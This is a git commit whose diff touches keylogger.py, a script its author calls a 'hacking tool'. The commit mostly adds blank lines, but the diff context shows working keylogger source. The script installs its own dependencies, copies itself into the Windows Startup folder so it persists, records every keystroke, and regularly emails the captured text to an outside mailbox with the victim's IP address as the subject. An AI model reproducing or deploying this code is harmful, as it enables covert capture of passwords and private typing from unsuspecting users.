0d0c712acdf3f9cd9c7826417e17789fbc366ac9
natidemeke3 <natidemeke3@gmail.com>
2023-10-21 15:25:03 +0300

    i have make the code a little bit readable

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,10 @@
 #version keylogger.py 1.3.6////hacking tool\\\\\\\\\
 print("keylogger version###############1.3.6##################")
 #[3-17] i was trying to import some modules and if one of those modules is not found with the help of internet connection we can dowload the modules
+
+
+
+
 try:
   import shutil
   import os 
@@ -10,13 +14,18 @@ try:
   from email.message import EmailMessage
   import schedule
 
+
+
 except ModuleNotFoundError:
     modules = ["socket", "smtplib", "ssl", "schedule", "pynput"]
     from subprocess import call
     for module in modules: 
         call("python -m pip install " + module)
         print(f"{module} installed.....")
+
 #the next function is created to move this python file to startup file {you can see the startup folder by (windows + R) then type shell:startup}
+
+
 def move_file_to_startapp():
     main_destination = ['Hp', 'hp', 'user', 'lenovo', 'dell']
     current_dir = os.getcwd()
@@ -29,7 +38,11 @@ def move_file_to_startapp():
     print("line 19: new_directory =",current_dir)
 move_file_to_startapp()
 substitute = open(r"C:\\Users\\Hp\\Desktop\\no.txt", "w")
+
+
 #the next function is created to send email that contains what the user types to the main mail and also it uses the socket function because it send the user ip address as the subject using the smtplib module
+
+
 def sendmail(user_message, timeout=1):
     global substitute
     try:
@@ -47,8 +60,12 @@ def sendmail(user_message, timeout=1):
     except:
         print("line 45: email cannot be send because there was some sort of error....")
         substitute.write(word)
+
+
 word = " "
 #this is the function that records the pressed keys 
+
+
 def on_press(key):
     global word
     global substitute
@@ -66,5 +83,6 @@ def on_press(key):
     print("{0} pressed".format(key))
     if len(word) % 100 == 0:
         sendmail(word) 
+
 with Listener(on_press=on_press) as listener:
  listener.join()
